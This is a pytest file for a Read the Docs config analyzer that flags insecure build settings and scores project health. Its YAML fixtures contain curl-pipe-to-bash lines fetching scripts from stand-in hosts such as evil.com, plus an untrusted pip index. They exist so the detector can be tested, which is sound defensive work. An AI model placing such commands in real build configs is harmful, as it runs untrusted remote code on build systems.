"""Tests for ReadTheDocsAnalyzer."""

from pathlib import Path

from devai.readthedocs_analyzer import ReadTheDocsAnalyzer, ReadTheDocsFinding


INSECURE_RTD_YAML = """\
version: 1

build:
  os: ubuntu-22.04
  tools:
    python: latest
  commands:
    - curl http://evil.example.com/install.sh | bash
    - sudo apt-get install suspicious-package
    - pip install --index-url http://insecure.pypi.example/simple mypkg

python:
  install:
    - requirements: ../outside/requirements.txt

sphinx:
  configuration: docs/conf.py
"""

HARDENED_RTD_YAML = """\
version: 2

build:
  os: ubuntu-22.04
  tools:
    python: "3.12"

python:
  install:
    - requirements: docs/requirements.txt

sphinx:
  configuration: docs/conf.py

formats: []
"""


class TestReadTheDocsAnalyzer:
    def test_detects_insecure_readthedocs_yaml(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(INSECURE_RTD_YAML, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "curl_pipe_bash" in kinds
        assert "arbitrary_command" in kinds
        assert "sudo_command" in kinds
        assert "pip_untrusted_index" in kinds
        assert "requirements_parent_path" in kinds
        assert "legacy_config_version" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_readthedocs_scores_well(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(HARDENED_RTD_YAML, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() >= 90.0

    def test_readthedocs_yml_also_scanned(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yml").write_text(
            "version: 2\nbuild:\n  commands:\n    - curl http://evil.com/x | bash\n",
            encoding="utf-8",
        )
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert len(analyzer.config_files()) == 1
        assert any(f.kind == "curl_pipe_bash" for f in findings)

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.config_files == 0

    def test_generate_hardened_template(self):
        template = ReadTheDocsAnalyzer(".").generate_hardened_template()
        assert "version: 2" in template
        assert 'python: "3.12"' in template

    def test_finding_format(self):
        finding = ReadTheDocsFinding(
            kind="curl_pipe_bash",
            severity="high",
            message="test message",
            path=".readthedocs.yaml",
            lineno=2,
        )
        assert "high" in finding.format()
        assert ".readthedocs.yaml:2" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(
            "version: 2\nbuild:\n  commands:\n    - curl http://evil.com/x | bash\n",
            encoding="utf-8",
        )
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Read the Docs analysis:" in context
        assert "curl" in context

    def test_summary(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(
            "version: 2\nbuild:\n  commands:\n    - curl http://evil.com/x | bash\n",
            encoding="utf-8",
        )
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        summary = analyzer.summary()
        assert "Read the Docs configs:" in summary
        assert "1 file(s)" in summary

    def test_project_health_integration(self, tmp_path: Path):
        from devai.project_health import ProjectHealth

        (tmp_path / ".readthedocs.yaml").write_text(
            "version: 2\nbuild:\n  commands:\n    - curl http://evil.com/x | bash\n",
            encoding="utf-8",
        )
        report = ProjectHealth(str(tmp_path)).analyze()
        rtd = next(c for c in report.categories if c.name == "readthedocs")
        assert rtd.score < 100.0
        assert rtd.details.get("findings", 0) > 0
